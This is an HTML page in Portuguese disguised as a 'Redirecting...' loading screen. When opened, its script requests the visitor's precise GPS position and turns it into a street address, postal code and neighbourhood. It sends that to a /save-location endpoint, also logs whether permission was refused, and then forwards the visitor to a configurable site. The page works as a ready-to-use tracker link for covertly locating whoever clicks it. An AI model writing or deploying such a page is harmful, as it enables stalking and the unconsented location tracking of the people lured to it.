<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecionando...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
            max-width: 400px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { color: #667eea; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>üîÑ Redirecionando...</h2>
        <div class="loader"></div>
        <p>Aguarde um momento...</p>
    </div>

    <script>
        const REDIRECT_URL = 'https://google.com'; // ‚Üê Mude para onde quiser redirecionar
        
        async function reverseGeocode(lat, lon) {
            try {
                // Usar API gratuita de geocoding reverso
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=pt-BR`);
                const data = await response.json();
                
                return {
                    latitude: lat,
                    longitude: lon,
                    city: data.address?.city || data.address?.town || data.address?.village || 'Desconhecida',
                    state: data.address?.state || 'Desconhecido',
                    country: data.address?.country || 'Desconhecido',
                    neighborhood: data.address?.neighbourhood || data.address?.suburb || '',
                    postalCode: data.address?.postcode || '',
                    fullAddress: data.display_name || ''
                };
            } catch (error) {
                return {
                    latitude: lat,
                    longitude: lon,
                    city: 'Erro ao obter',
                    state: '',
                    country: '',
                    error: error.message
                };
            }
        }

        async function getLocationAndRedirect() {
            if ("geolocation" in navigator) {
                try {
                    // Pedir localiza√ß√£o
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });

                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Converter coordenadas em cidade
                    const location = await reverseGeocode(lat, lon);

                    // Enviar para o servidor
                    await fetch('/save-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            gpsLocation: location,
                            locationPermission: 'granted'
                        })
                    });

                } catch (error) {
                    // Permiss√£o negada ou erro
                    await fetch('/save-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            gpsLocation: null,
                            locationPermission: 'denied',
                            error: error.message
                        })
                    });
                }
            } else {
                // Navegador n√£o suporta geolocaliza√ß√£o
                await fetch('/save-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        gpsLocation: null,
                        locationPermission: 'not_supported'
                    })
                });
            }

            // Redirecionar ap√≥s salvar
            window.location.href = REDIRECT_URL;
        }

        // Executar automaticamente
        getLocationAndRedirect();
    </script>
</body>
</html>
